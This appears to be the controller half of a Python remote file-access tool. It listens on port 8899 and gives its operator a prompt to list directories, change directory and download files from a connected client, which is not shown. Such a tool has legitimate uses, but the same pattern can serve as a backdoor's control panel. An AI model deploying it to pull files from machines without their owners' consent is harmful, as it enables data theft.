import threading
import socket
from tools import *
from termcolor import colored

host = "0.0.0.0"
port = 8899

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
print(f'server listen on {host}:{port}.....')
server.listen()

def list_file(res: dict):
    files = res["files"]
    types = res["types"]
    for i in range(len(files)):
        if types[i] == 1:
            print(files[i])
        else:
            print(colored(files[i], "blue"))

def download_file(client: socket.socket, name: str):
    send_data(client, {"cmd": "download", "name": name})
    data = recv_data(client)
    if data["status"] == 1:
        res = recv_data(client)
        file = open(name, "wb")
        file.write(res["content"])
        file.close()
        print(f'{name} already downloaded!')
    else:
        print("File path dose not exit!")

if __name__ == '__main__':
    client, addr = server.accept()
    print(f'connected to {addr}...')
    work_dir = recv_data(client)["pwd"]
    while True:
        print(f'{work_dir}>', end='')
        cmd = str(input())
        if len(cmd) == 0:
            continue
        if cmd == "exit":
            send_data(client, {"cmd": "exit"})
            server.close()
            break
        if cmd == "ls":
            data = {'cmd': cmd}
            send_data(client, data)
            res = recv_data(client)
            list_file(res)
        if len(cmd.split(" ")) == 2 and cmd.split(" ")[0] == "cd":
            send_data(client, {"cmd": "cd", "path": cmd.split(" ")[1]})
            res = recv_data(client)
            if res["pwd"] == "error":
                print(res["error"])
            else:
                work_dir = res["pwd"]
        if len(cmd.split(" ")) == 2 and cmd.split(" ")[0] == "download":
            download_file(client, cmd.split(" ")[1])










